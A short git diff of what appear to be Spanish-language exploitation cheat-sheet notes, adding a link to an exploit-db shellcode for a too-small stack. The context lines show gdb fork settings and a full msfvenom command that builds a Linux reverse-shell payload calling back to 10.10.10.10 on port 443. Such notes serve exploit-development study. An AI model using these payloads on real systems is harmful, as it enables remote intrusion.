@@ -88,6 +88,8 @@ Evitar que cree un fork -> set-detach-on-fork off     set follow-fork-mode child
 
  - Msfvenom -> ``` msfvenom -p linux/x86/shell_Reverse_tcp LHOST=10.10.10.10 LPORT=443 -b "\x00\x0a" -f python```
 
+ - Exploit database 
+pila demasaido pequeña -> [reuseaddr](https://www.exploit-db.com/shellcodes/47530)
 
 
 
